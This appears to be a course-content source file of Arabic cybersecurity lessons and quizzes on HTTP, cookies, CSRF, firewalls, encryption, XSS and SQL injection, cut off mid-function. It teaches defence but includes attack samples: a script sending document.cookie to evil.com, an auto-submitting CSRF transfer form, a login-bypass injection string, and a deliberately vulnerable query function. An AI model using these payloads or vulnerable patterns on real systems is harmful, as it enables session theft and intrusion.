/**
 * محتوى موسّع للأمن السيبراني - Expanded Cyber Security Content
 * دروس وتحديات إضافية شاملة
 */

import { Lesson, Challenge } from './courseData';

// ===== دروس الأمن السيبراني الموسّعة =====
export const EXPANDED_CYBER_LESSONS: Lesson[] = [
  {
    id: 'cyber-http-basics',
    courseId: 'cyber-basics',
    title: 'أساسيات HTTP للأمن السيبراني',
    description: 'فهم كيف يعمل الويب قبل حمايته',
    content: `
# بروتوكول HTTP

## ما هو HTTP؟
**H**yper**T**ext **T**ransfer **P**rotocol
البروتوكول المستخدم لنقل صفحات الويب.

## HTTP Methods (الطرق)

### GET
- **الاستخدام**: طلب بيانات من الخادم
- **آمن**: لا يغيّر البيانات
- **المعاملات**: في URL (مرئية)
\`\`\`
GET /users?id=123 HTTP/1.1
\`\`\`

### POST
- **الاستخدام**: إرسال بيانات للخادم
- **غير آمن**: يعدّل البيانات
- **المعاملات**: في Body (غير مرئية في URL)
\`\`\`
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": "123"}
\`\`\`

### PUT, DELETE, PATCH
- تعديل وحذف البيانات

## أجزاء الطلب (Request)

\`\`\`
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
Authorization: Bearer token
\`\`\`

## أجزاء الرد (Response)

\`\`\`
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789
Content-Length: 1234

<html>...</html>
\`\`\`

## Status Codes
- **200**: نجح
- **301/302**: إعادة توجيه
- **400**: خطأ من العميل
- **401**: غير مصرّح
- **403**: ممنوع
- **404**: غير موجود
- **500**: خطأ في الخادم

## Headers مهمة للأمن
- **Content-Security-Policy**: منع XSS
- **X-Frame-Options**: منع Clickjacking
- **Strict-Transport-Security**: فرض HTTPS
- **X-Content-Type-Options**: منع MIME sniffing

## HTTP vs HTTPS
- **HTTP**: نص عادي ⚠️
- **HTTPS**: مشفر بـ SSL/TLS ✅
`,
    codeExample: `# محاكاة طلبات HTTP في Python
import requests

# ===== GET Request =====
def make_get_request():
    """
    طلب GET بسيط
    """
    url = "https://jsonplaceholder.typicode.com/users/1"
    
    # إرسال الطلب
    response = requests.get(url)
    
    print(f"Status Code: {response.status_code}")
    print(f"Headers: {dict(response.headers)}")
    print(f"Content: {response.json()}")
    
    return response

# ===== POST Request =====
def make_post_request():
    """
    طلب POST لإرسال بيانات
    """
    url = "https://jsonplaceholder.typicode.com/posts"
    
    data = {
        "title": "عنوان المقال",
        "body": "محتوى المقال",
        "userId": 1
    }
    
    response = requests.post(url, json=data)
    
    print(f"Status: {response.status_code}")
    print(f"Response: {response.json()}")
    
    return response

# ===== تحليل Headers =====
def analyze_security_headers(url):
    """
    فحص headers الأمان في موقع
    """
    response = requests.get(url)
    headers = response.headers
    
    security_headers = {
        "Content-Security-Policy": headers.get("Content-Security-Policy"),
        "X-Frame-Options": headers.get("X-Frame-Options"),
        "Strict-Transport-Security": headers.get("Strict-Transport-Security"),
        "X-Content-Type-Options": headers.get("X-Content-Type-Options"),
        "X-XSS-Protection": headers.get("X-XSS-Protection"),
    }
    
    print(f"\\n=== فحص Headers الأمان لـ {url} ===")
    for header, value in security_headers.items():
        status = "✅" if value else "❌"
        print(f"{status} {header}: {value or 'غير موجود'}")
    
    return security_headers

# ===== Cookies =====
def demo_cookies():
    """
    عرض توضيحي للـ Cookies
    """
    session = requests.Session()
    
    # الخادم يرسل Cookie
    response = session.get("https://httpbin.org/cookies/set/session/abc123")
    
    # الكوكيز المخزنة
    print(f"Cookies: {session.cookies.get_dict()}")
    
    # الطلب التالي يرسل Cookie تلقائياً
    response = session.get("https://httpbin.org/cookies")
    print(f"Server received: {response.json()}")

# تشغيل الأمثلة
# make_get_request()
# make_post_request()
# analyze_security_headers("https://google.com")
# demo_cookies()`,
    language: 'python',
    xpReward: 100,
    order: 0.5,
    quiz: {
      question: 'أي HTTP Method يُستخدم لإرسال بيانات حساسة؟',
      options: ['GET', 'POST', 'DELETE', 'HEAD'],
      correctAnswer: 1,
      explanation: 'POST يرسل البيانات في Body وليس في URL المرئي',
    },
  },
  {
    id: 'cyber-cookies-sessions',
    courseId: 'cyber-basics',
    title: 'Cookies و Sessions',
    description: 'فهم كيف تحفظ المواقع حالة المستخدم',
    content: `
# Cookies و Sessions

## ما هي Cookies؟
ملفات نصية صغيرة يخزنها المتصفح.

## كيف تعمل؟
1. الخادم يرسل: \`Set-Cookie: session=abc123\`
2. المتصفح يحفظها
3. المتصفح يرسلها في كل طلب: \`Cookie: session=abc123\`

## أنواع Cookies

### Session Cookies
- تُحذف عند إغلاق المتصفح
- للجلسة المؤقتة

### Persistent Cookies
- تبقى لفترة محددة
- \`Expires=Wed, 21 Oct 2025 07:28:00 GMT\`

## خصائص الأمان

### HttpOnly
- لا يمكن الوصول لها من JavaScript
- حماية من XSS
\`\`\`
Set-Cookie: session=abc123; HttpOnly
\`\`\`

### Secure
- ترسل فقط عبر HTTPS
\`\`\`
Set-Cookie: session=abc123; Secure
\`\`\`

### SameSite
- منع CSRF
\`\`\`
Set-Cookie: session=abc123; SameSite=Strict
\`\`\`

## Sessions

### ما هي الجلسة (Session)؟
بيانات المستخدم المخزنة في الخادم.

### كيف تعمل؟
1. المستخدم يسجّل الدخول
2. الخادم ينشئ session ويرسل session ID في cookie
3. المتصفح يرسل session ID في كل طلب
4. الخادم يستخدم ID للوصول لبيانات الجلسة

## هجمات شائعة

### Session Hijacking
سرقة session ID لانتحال الهوية.

### Session Fixation
إجبار المستخدم على استخدام session ID معروف.

### الوقاية
- استخدم HTTPS
- HttpOnly و Secure cookies
- أعد إنشاء session ID بعد تسجيل الدخول
- انتهاء صلاحية الجلسات
`,
    codeExample: `# مثال على Sessions و Cookies في Flask
from flask import Flask, session, request, make_response
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# ===== استخدام Cookies =====
@app.route('/set_cookie')
def set_cookie():
    """تعيين Cookie"""
    response = make_response("Cookie تم تعيينها!")
    
    # Cookie بسيط
    response.set_cookie('username', 'ahmed')
    
    # Cookie آمن
    response.set_cookie(
        'session_id',
        secrets.token_hex(16),
        max_age=3600,      # ساعة واحدة
        secure=True,       # HTTPS فقط
        httponly=True,     # لا يمكن الوصول من JS
        samesite='Lax'     # حماية CSRF
    )
    
    return response

@app.route('/get_cookie')
def get_cookie():
    """قراءة Cookie"""
    username = request.cookies.get('username')
    return f"مرحباً {username}"

@app.route('/delete_cookie')
def delete_cookie():
    """حذف Cookie"""
    response = make_response("Cookie تم حذفها!")
    response.set_cookie('username', '', max_age=0)
    return response

# ===== استخدام Sessions =====
@app.route('/login')
def login():
    """تسجيل دخول وإنشاء session"""
    # تخزين بيانات في session
    session['user_id'] = 123
    session['username'] = 'ahmed'
    session['is_admin'] = False
    
    return "تم تسجيل الدخول!"

@app.route('/dashboard')
def dashboard():
    """صفحة محمية تحتاج session"""
    if 'user_id' not in session:
        return "يجب تسجيل الدخول أولاً!", 401
    
    username = session.get('username')
    return f"مرحباً {username}"

@app.route('/logout')
def logout():
    """تسجيل خروج وحذف session"""
    session.clear()
    return "تم تسجيل الخروج!"

# ===== Session Security =====
@app.route('/secure_login', methods=['POST'])
def secure_login():
    """تسجيل دخول آمن"""
    username = request.form.get('username')
    password = request.form.get('password')
    
    # التحقق من البيانات (مثال مبسط)
    if username == 'admin' and password == 'secret':
        # إعادة إنشاء session ID (منع Session Fixation)
        session.clear()
        
        # تعيين بيانات جديدة
        session['user_id'] = 1
        session['username'] = username
        
        # تعيين علامة لتتبع regeneration
        session['_regenerated'] = True
        
        return "تم تسجيل الدخول بأمان!"
    
    return "بيانات خاطئة!", 401

# ===== محاكاة Session Hijacking Detection =====
@app.before_request
def check_session_integrity():
    """فحص سلامة الجلسة"""
    if 'user_id' in session:
        # تحقق من User-Agent (بسيط جداً)
        current_ua = request.headers.get('User-Agent')
        stored_ua = session.get('_user_agent')
        
        if stored_ua and stored_ua != current_ua:
            # محاولة hijacking محتملة
            session.clear()
            return "جلسة مشبوهة!", 401

@app.after_request
def store_user_agent(response):
    """حفظ User-Agent في session"""
    if 'user_id' in session:
        session['_user_agent'] = request.headers.get('User-Agent')
    return response`,
    language: 'python',
    xpReward: 120,
    order: 0.7,
    quiz: {
      question: 'ما فائدة خاصية HttpOnly في Cookie؟',
      options: [
        'تسريع التحميل',
        'منع الوصول من JavaScript',
        'تشفير القيمة',
        'إرسالها عبر HTTP فقط',
      ],
      correctAnswer: 1,
      explanation:
        'HttpOnly تمنع JavaScript من الوصول للـ Cookie، حماية من XSS',
    },
  },
  {
    id: 'cyber-csrf',
    courseId: 'cyber-advanced',
    title: 'CSRF - Cross-Site Request Forgery',
    description: 'هجمات تزوير الطلبات وكيفية منعها',
    content: `
# CSRF - Cross-Site Request Forgery

## ما هو CSRF؟
خداع المستخدم لتنفيذ إجراءات غير مقصودة على موقع هو مسجّل فيه.

## مثال على الهجوم

### السيناريو
1. المستخدم مسجّل دخول في موقع البنك
2. المهاجم يرسل رابط ضار
3. الرابط يحوّل أموال للمهاجم
4. المتصفح يرسل session cookie تلقائياً

### كود الهجوم
\`\`\`html
<!-- في موقع المهاجم -->
<img src="https://bank.com/transfer?to=hacker&amount=10000">

<!-- أو نموذج يُرسل تلقائياً -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
\`\`\`

## لماذا ينجح؟
- المتصفح يرسل cookies تلقائياً
- الموقع لا يتحقق من مصدر الطلب

## الوقاية من CSRF

### 1. CSRF Token ✅
توكن سري في كل نموذج.

\`\`\`html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123xyz">
  <input name="to">
  <input name="amount">
  <button>تحويل</button>
</form>
\`\`\`

### 2. SameSite Cookie ✅
\`\`\`
Set-Cookie: session=abc; SameSite=Strict
\`\`\`

- **Strict**: لا ترسل من مواقع أخرى أبداً
- **Lax**: ترسل فقط مع GET من روابط
- **None**: ترسل دائماً (غير آمن)

### 3. التحقق من Referer Header
\`\`\`python
if request.headers.get('Referer') != 'https://mysite.com':
    return "طلب مشبوه", 403
\`\`\`

### 4. طلب إعادة كلمة المرور
للعمليات الحساسة جداً.

## CSRF vs XSS
- **XSS**: حقن كود في الموقع نفسه
- **CSRF**: تنفيذ إجراءات من موقع آخر
`,
    codeExample: `# حماية من CSRF في Flask
from flask import Flask, session, request, render_template_string
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)

# ===== توليد CSRF Token =====
def generate_csrf_token():
    """توليد توكن CSRF فريد"""
    if '_csrf_token' not in session:
        session['_csrf_token'] = secrets.token_hex(16)
    return session['_csrf_token']

# جعل الدالة متاحة في templates
app.jinja_env.globals['csrf_token'] = generate_csrf_token

# ===== التحقق من CSRF Token =====
def verify_csrf_token():
    """التحقق من توكن CSRF"""
    token = request.form.get('csrf_token')
    
    if not token or token != session.get('_csrf_token'):
        return False
    return True

# ===== صفحة بنموذج محمي =====
@app.route('/transfer', methods=['GET', 'POST'])
def transfer():
    if request.method == 'POST':
        # التحقق من CSRF Token
        if not verify_csrf_token():
            return "⚠️ CSRF Token غير صالح!", 403
        
        # معالجة التحويل
        to = request.form.get('to')
        amount = request.form.get('amount')
        
        return f"✅ تم تحويل {amount} إلى {to}"
    
    # عرض النموذج
    return render_template_string('''
        <form method="POST">
            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
            
            <input name="to" placeholder="المستلم" required>
            <input name="amount" placeholder="المبلغ" required>
            
            <button type="submit">تحويل</button>
        </form>
    ''')

# ===== Decorator للحماية التلقائية =====
from functools import wraps

def csrf_protect(f):
    """Decorator للتحقق من CSRF في POST requests"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if request.method == 'POST':
            if not verify_csrf_token():
                return "CSRF Token غير صالح!", 403
        return f(*args, **kwargs)
    return decorated_function

@app.route('/delete_account', methods=['POST'])
@csrf_protect
def delete_account():
    """عملية حساسة محمية من CSRF"""
    return "تم حذف الحساب!"

# ===== تعيين SameSite Cookie =====
@app.after_request
def set_secure_cookies(response):
    """إضافة خصائص أمان للـ cookies"""
    # Session cookie
    response.set_cookie(
        'session',
        session.get('_id', ''),
        secure=True,        # HTTPS فقط
        httponly=True,      # لا يمكن الوصول من JS
        samesite='Strict'   # منع CSRF
    )
    return response

# ===== فحص Referer (طبقة إضافية) =====
@app.before_request
def check_referer():
    """التحقق من Referer للعمليات الحساسة"""
    if request.method == 'POST':
        referer = request.headers.get('Referer', '')
        
        # تحقق من أن الطلب من نفس الموقع
        if not referer.startswith(request.host_url):
            return "Referer مشبوه!", 403`,
    language: 'python',
    xpReward: 180,
    order: 0.5,
    quiz: {
      question: 'ما هي أفضل طريقة للحماية من CSRF؟',
      options: [
        'تشفير البيانات',
        'CSRF Token + SameSite Cookie',
        'CAPTCHA في كل نموذج',
        'تعطيل JavaScript',
      ],
      correctAnswer: 1,
      explanation:
        'CSRF Token يتحقق من مصدر الطلب، وSameSite يمنع إرسال cookies من مواقع أخرى',
    },
  },
  {
    id: 'cyber-firewall-basics',
    courseId: 'cyber-network',
    title: 'Firewalls - جدران الحماية',
    description: 'فهم كيف تحمي Firewalls الشبكات',
    content: `
# Firewalls - جدران الحماية

## ما هو Firewall؟
حاجز يراقب ويتحكم في حركة البيانات الداخلة والخارجة.

## كيف يعمل؟
يفحص الحزم (packets) بناءً على قواعد محددة:
- **Allow**: السماح
- **Deny**: الرفض
- **Drop**: رفض بصمت

## أنواع Firewalls

### 1. Packet Filtering
- يفحص headers فقط (IP, Port)
- سريع لكن بسيط
- مثال: \`iptables\`

### 2. Stateful Inspection
- يتتبع حالة الاتصالات
- أذكى وأكثر أماناً

### 3. Application Layer (WAF)
- يفحص محتوى البيانات
- يحمي من SQL Injection, XSS
- مثال: ModSecurity

### 4. Next-Generation Firewall (NGFW)
- يجمع كل شيء
- Deep Packet Inspection
- IDS/IPS مدمج

## قواعد Firewall الأساسية

### Default Deny
رفض كل شيء إلا المسموح صراحةً.

\`\`\`bash
# المبدأ
iptables -P INPUT DROP
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
\`\`\`

## أمثلة على القواعد
- السماح لـ HTTP/HTTPS
- رفض Telnet (غير آمن)
- السماح لـ SSH من IPs محددة
- رفض كل الدخول على MySQL من خارج الشبكة

## Hardware vs Software Firewall
| Hardware | Software |
|----------|----------|
| جهاز منفصل | برنامج على الجهاز |
| أسرع | أرخص |
| للشبكات | للأفراد |
| مثال: Cisco ASA | مثال: Windows Firewall |
`,
    codeExample: `# أمثلة على قواعد Firewall باستخدام iptables (Linux)

# ===== قواعد أساسية =====

# 1. رفض كل شيء افتراضياً (Default Deny)
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# 2. السماح للـ loopback (127.0.0.1)
sudo iptables -A INPUT -i lo -j ACCEPT

# 3. السماح للاتصالات الحالية
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# ===== السماح لخدمات محددة =====

# السماح لـ SSH (منفذ 22)
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# السماح لـ HTTP و HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# السماح لـ DNS
sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT

# ===== قواعد متقدمة =====

# السماح لـ SSH من IP محدد فقط
sudo iptables -A INPUT -p tcp -s 192.168.1.100 --dport 22 -j ACCEPT

# رفض MySQL من خارج الشبكة المحلية
sudo iptables -A INPUT -p tcp --dport 3306 ! -s 192.168.1.0/24 -j DROP

# منع Ping Flooding
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit \\
  --limit 1/second --limit-burst 10 -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# منع Port Scanning
sudo iptables -A INPUT -p tcp --tcp-flags ALL NONE -j DROP
sudo iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP

# ===== عرض القواعد =====
# sudo iptables -L -v -n

# ===== حفظ القواعد =====
# sudo iptables-save > /etc/iptables/rules.v4

# ===== Python: محاكاة Firewall بسيط =====
class SimpleFirewall:
    """
    محاكاة بسيطة لـ Firewall
    """
    def __init__(self):
        self.rules = []
        self.default_action = 'DROP'
    
    def add_rule(self, protocol, port, action, source_ip=None):
        """إضافة قاعدة"""
        rule = {
            'protocol': protocol,
            'port': port,
            'action': action,
            'source_ip': source_ip
        }
        self.rules.append(rule)
    
    def check_packet(self, protocol, port, source_ip):
        """فحص حزمة بيانات"""
        for rule in self.rules:
            # تطابق البروتوكول والمنفذ
            if (rule['protocol'] == protocol and 
                rule['port'] == port):
                
                # تطابق IP إذا كان محدداً
                if rule['source_ip'] is None or rule['source_ip'] == source_ip:
                    return rule['action']
        
        # القاعدة الافتراضية
        return self.default_action

# إنشاء firewall
fw = SimpleFirewall()

# إضافة قواعد
fw.add_rule('TCP', 80, 'ALLOW')        # السماح لـ HTTP
fw.add_rule('TCP', 443, 'ALLOW')       # السماح لـ HTTPS
fw.add_rule('TCP', 22, 'ALLOW', '192.168.1.100')  # SSH من IP محدد
fw.add_rule('TCP', 3306, 'DROP')       # رفض MySQL

# اختبار
packets = [
    ('TCP', 80, '8.8.8.8'),
    ('TCP', 22, '192.168.1.100'),
    ('TCP', 22, '1.2.3.4'),
    ('TCP', 3306, '192.168.1.50'),
]

for proto, port, ip in packets:
    action = fw.check_packet(proto, port, ip)
    print(f"{action}: {proto}:{port} from {ip}")`,
    language: 'bash',
    xpReward: 140,
    order: 0.8,
    quiz: {
      question: 'ما هو مبدأ Default Deny في Firewall؟',
      options: [
        'السماح لكل شيء',
        'رفض كل شيء إلا المسموح صراحةً',
        'رفض كل شيء دائماً',
        'السماح للمنافذ الأولى فقط',
      ],
      correctAnswer: 1,
      explanation:
        'Default Deny يرفض كل شيء افتراضياً، ونسمح فقط للخدمات المحددة - أكثر أماناً',
    },
  },
  {
    id: 'cyber-network-001',
    courseId: 'cyber-network',
    title: 'فهم بروتوكولات الشبكات',
    description: 'تعلم كيف تعمل الشبكات وبروتوكولاتها',
    content: `
# بروتوكولات الشبكات

## ما هو البروتوكول؟
قواعد ومعايير للتواصل بين الأجهزة عبر الشبكة.

## نموذج OSI (7 طبقات)
1. **Physical** - الطبقة الفيزيائية (كابلات)
2. **Data Link** - رابط البيانات (MAC address)
3. **Network** - الشبكة (IP address)
4. **Transport** - النقل (TCP/UDP)
5. **Session** - الجلسة
6. **Presentation** - العرض
7. **Application** - التطبيق (HTTP, FTP, DNS)

## البروتوكولات الأساسية

### TCP vs UDP
| TCP | UDP |
|-----|-----|
| موثوق | غير موثوق |
| بطيء نسبياً | سريع |
| HTTP, FTP | DNS, VoIP |

### HTTP vs HTTPS
- **HTTP**: غير مشفر ⚠️
- **HTTPS**: مشفر بـ TLS/SSL ✅

### DNS
تحويل أسماء النطاقات إلى عناوين IP:
\`\`\`
google.com → 142.250.185.46
\`\`\`

## المنافذ الشائعة
- **21**: FTP
- **22**: SSH
- **23**: Telnet ⚠️
- **25**: SMTP
- **53**: DNS
- **80**: HTTP
- **443**: HTTPS
- **3306**: MySQL
- **3389**: RDP
`,
    codeExample: `# فحص المنافذ المفتوحة باستخدام Python
import socket

def scan_ports(host, start_port, end_port):
    """
    فحص المنافذ المفتوحة على هوست معين
    """
    open_ports = []
    
    print(f"[*] بدء فحص {host}")
    print(f"[*] المنافذ من {start_port} إلى {end_port}")
    print("-" * 40)
    
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # timeout بعد ثانية
        
        result = sock.connect_ex((host, port))
        
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "غير معروف"
            
            print(f"[+] المنفذ {port} مفتوح ({service})")
            open_ports.append(port)
        
        sock.close()
    
    print("-" * 40)
    print(f"[*] تم العثور على {len(open_ports)} منفذ مفتوح")
    return open_ports

# مثال الاستخدام (على localhost فقط للتجربة)
# scan_ports("127.0.0.1", 1, 1024)`,
    language: 'python',
    xpReward: 150,
    order: 1,
    quiz: {
      question: 'ما هو المنفذ الافتراضي لـ HTTPS؟',
      options: ['80', '443', '8080', '22'],
      correctAnswer: 1,
      explanation: 'HTTPS يستخدم المنفذ 443 بينما HTTP يستخدم 80',
    },
  },
  {
    id: 'cyber-encryption-001',
    courseId: 'cyber-network',
    title: 'أساسيات التشفير',
    description: 'فهم أنواع التشفير وكيفية استخدامها',
    content: `
# أساسيات التشفير (Cryptography)

## ما هو التشفير؟
تحويل البيانات إلى صيغة غير مقروءة لحمايتها.

## أنواع التشفير

### 1. التشفير المتماثل (Symmetric)
- **مفتاح واحد** للتشفير وفك التشفير
- سريع ولكن توزيع المفتاح صعب
- أمثلة: AES, DES, 3DES

### 2. التشفير غير المتماثل (Asymmetric)
- **مفتاحان**: عام (public) وخاص (private)
- أبطأ ولكن أكثر أماناً
- أمثلة: RSA, ECC

### 3. دوال الهاش (Hashing)
- تحويل أحادي الاتجاه
- للتحقق من سلامة البيانات
- أمثلة: MD5 ⚠️, SHA-256, bcrypt

## استخدامات التشفير
- 🔐 حماية كلمات المرور (hashing)
- 📧 تشفير الرسائل
- 🌐 HTTPS (TLS/SSL)
- 💳 المعاملات المالية
- 📱 تشفير الهواتف

## قواعد مهمة
1. **لا تخترع تشفيرك الخاص!**
2. استخدم مكتبات موثوقة
3. MD5 و SHA-1 لم تعد آمنة للتشفير
4. أطوال المفاتيح المناسبة:
   - AES: 256 bit
   - RSA: 2048+ bit
`,
    codeExample: `# أمثلة على التشفير في Python
import hashlib
from cryptography.fernet import Fernet
import bcrypt

# ===== 1. Hashing مع SHA-256 =====
def hash_sha256(data):
    """تشفير نص باستخدام SHA-256"""
    return hashlib.sha256(data.encode()).hexdigest()

# مثال
password = "MySecretPassword123"
hashed = hash_sha256(password)
print(f"SHA-256: {hashed}")

# ===== 2. تشفير كلمات المرور مع bcrypt =====
def hash_password(password):
    """تشفير كلمة مرور بشكل آمن"""
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt)

def verify_password(password, hashed):
    """التحقق من كلمة المرور"""
    return bcrypt.checkpw(password.encode(), hashed)

# مثال
hashed_pw = hash_password("MyPassword123")
print(f"bcrypt: {hashed_pw}")
print(f"صحيح: {verify_password('MyPassword123', hashed_pw)}")
print(f"خاطئ: {verify_password('WrongPassword', hashed_pw)}")

# ===== 3. تشفير متماثل مع Fernet =====
def encrypt_message(message, key):
    """تشفير رسالة"""
    f = Fernet(key)
    return f.encrypt(message.encode())

def decrypt_message(encrypted, key):
    """فك تشفير رسالة"""
    f = Fernet(key)
    return f.decrypt(encrypted).decode()

# توليد مفتاح
key = Fernet.generate_key()
print(f"المفتاح: {key}")

# تشفير وفك تشفير
message = "رسالة سرية جداً!"
encrypted = encrypt_message(message, key)
print(f"مشفر: {encrypted}")
decrypted = decrypt_message(encrypted, key)
print(f"أصلي: {decrypted}")`,
    language: 'python',
    xpReward: 180,
    order: 2,
    quiz: {
      question: 'أي نوع من التشفير يستخدم مفتاحين (عام وخاص)؟',
      options: ['Symmetric', 'Hashing', 'Asymmetric', 'Encoding'],
      correctAnswer: 2,
      explanation:
        'التشفير غير المتماثل (Asymmetric) يستخدم مفتاح عام للتشفير ومفتاح خاص لفك التشفير',
    },
  },
  {
    id: 'cyber-xss-001',
    courseId: 'cyber-advanced',
    title: 'هجمات XSS وكيفية منعها',
    description: 'فهم Cross-Site Scripting وحماية تطبيقاتك',
    content: `
# هجمات XSS (Cross-Site Scripting)

## ما هو XSS؟
حقن سكريبتات ضارة في صفحات الويب التي يشاهدها مستخدمون آخرون.

## أنواع XSS

### 1. Stored XSS (المخزّن)
- الأخطر 🔴
- السكريبت يُخزن في قاعدة البيانات
- مثال: تعليق يحتوي على \`<script>\`

### 2. Reflected XSS (المنعكس)
- السكريبت في URL
- يتطلب إقناع الضحية بالنقر
- مثال: رابط بحث ضار

### 3. DOM-based XSS
- التنفيذ في المتصفح فقط
- لا يصل للخادم

## مثال على الهجوم
\`\`\`html
<!-- تعليق ضار -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
\`\`\`

## الوقاية من XSS

### 1. تنظيف المدخلات (Sanitization)
\`\`\`javascript
// تحويل الأحرف الخاصة
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
\`\`\`

### 2. Content Security Policy (CSP)
\`\`\`
Content-Security-Policy: default-src 'self'
\`\`\`

### 3. HttpOnly Cookies
\`\`\`
Set-Cookie: session=abc123; HttpOnly; Secure
\`\`\`

### 4. استخدام مكتبات آمنة
- React: يهرب HTML تلقائياً
- Vue: استخدم v-text بدلاً من v-html
`,
    codeExample: `# مثال على تنظيف المدخلات في Python (Flask)
from flask import Flask, request, escape
from markupsafe import Markup
import bleach

app = Flask(__name__)

# ===== طريقة 1: escape الأساسي =====
@app.route('/comment', methods=['POST'])
def add_comment_v1():
    comment = request.form.get('comment', '')
    # تحويل < > إلى &lt; &gt;
    safe_comment = escape(comment)
    return f"<p>{safe_comment}</p>"

# ===== طريقة 2: مكتبة bleach (الأفضل) =====
@app.route('/comment_v2', methods=['POST'])
def add_comment_v2():
    comment = request.form.get('comment', '')
    
    # السماح بعناصر محددة فقط
    allowed_tags = ['b', 'i', 'u', 'a', 'p', 'br']
    allowed_attrs = {'a': ['href', 'title']}
    
    safe_comment = bleach.clean(
        comment,
        tags=allowed_tags,
        attributes=allowed_attrs,
        strip=True
    )
    
    return f"<p>{safe_comment}</p>"

# ===== طريقة 3: التحقق من URLs =====
def is_safe_url(url):
    """التحقق من أن الرابط آمن"""
    from urllib.parse import urlparse
    
    # منع javascript: و data: URLs
    if url.lower().startswith(('javascript:', 'data:', 'vbscript:')):
        return False
    
    # التحقق من النطاق
    parsed = urlparse(url)
    if parsed.netloc and parsed.netloc != 'example.com':
        return False
    
    return True

# ===== مثال على CSP Header =====
@app.after_request
def add_security_headers(response):
    # Content Security Policy
    response.headers['Content-Security-Policy'] = \\
        "default-src 'self'; " \\
        "script-src 'self'; " \\
        "style-src 'self' 'unsafe-inline'; " \\
        "img-src 'self' data:; "
    
    # منع التضمين في iframes
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    
    # منع MIME type sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    return response`,
    language: 'python',
    xpReward: 200,
    order: 1,
    quiz: {
      question: 'أي نوع من XSS هو الأخطر؟',
      options: ['Reflected XSS', 'DOM-based XSS', 'Stored XSS', 'Self XSS'],
      correctAnswer: 2,
      explanation:
        'Stored XSS هو الأخطر لأن الكود الضار يُخزن ويؤثر على كل من يزور الصفحة',
    },
  },
  {
    id: 'cyber-sql-001',
    courseId: 'cyber-advanced',
    title: 'SQL Injection وكيفية الحماية',
    description: 'تعلم أخطر ثغرات قواعد البيانات',
    content: `
# SQL Injection

## ما هو SQL Injection؟
حقن أوامر SQL ضارة في استعلامات قاعدة البيانات.

## خطورته
- سرقة بيانات كاملة
- تعديل أو حذف البيانات
- تجاوز المصادقة
- تنفيذ أوامر النظام

## مثال على الهجوم

### كود ضعيف ⚠️
\`\`\`python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
\`\`\`

### الهجوم
\`\`\`
username: admin' --
password: أي شيء
\`\`\`

### النتيجة
\`\`\`sql
SELECT * FROM users WHERE username='admin' --' AND password='...'
\`\`\`
تم تجاوز التحقق من كلمة المرور!

## أنواع SQL Injection
1. **Classic**: نتائج مباشرة
2. **Blind**: لا نتائج مباشرة (True/False)
3. **Time-based**: تأخير زمني
4. **Union-based**: دمج استعلامات

## الوقاية

### 1. Parameterized Queries ✅
\`\`\`python
cursor.execute(
    "SELECT * FROM users WHERE username=? AND password=?",
    (username, password)
)
\`\`\`

### 2. ORM ✅
\`\`\`python
User.query.filter_by(username=username).first()
\`\`\`

### 3. Input Validation
### 4. Least Privilege (أقل صلاحيات)
### 5. Web Application Firewall (WAF)
`,
    codeExample: `# أمثلة على SQL Injection والحماية
import sqlite3

# ===== الطريقة الخاطئة (ضعيفة) ⚠️ =====
def login_vulnerable(username, password):
    """لا تستخدم هذا أبداً!"""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # خطر! SQL Injection ممكن
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    
    user = cursor.fetchone()
    conn.close()
    return user is not None

# ===== الطريقة الصحيحة (آمنة) ✅ =====
def login_secure(username, password):
    """الطريقة الآمنة باستخدام Parameterized Queries"""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # آمن! المعاملات محمية
    query = "SELECT * FROM users WHERE username=? AND password=?"
    cursor.execute(query, (username, password))
    
    user = cursor.fetchone()
    conn.close()
    return user is not None

# ===== استخدام ORM (الأفضل) ✅ =====
from sqlalchemy import create_engine, Column, String
from sqlalchemy.orm import sessionmaker, declarative_base

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    username = Column(String, primary_key=True)
    password = Column(String)

def login_orm(username, password):
    """الطريقة الأفضل باستخدام ORM"""
    engine = create_engine('sqlite:///users.db')
    Session = sessionmaker(bind=engine)
    session = Session()
    
    # آمن! ORM يحمي تلقائياً
    user = session.query(User).filter_by(
        username=username,
        password=password
    ).first()
    
    session.close()
    return user is not None

# ===== اختبار الضعف =====
def test_injection():
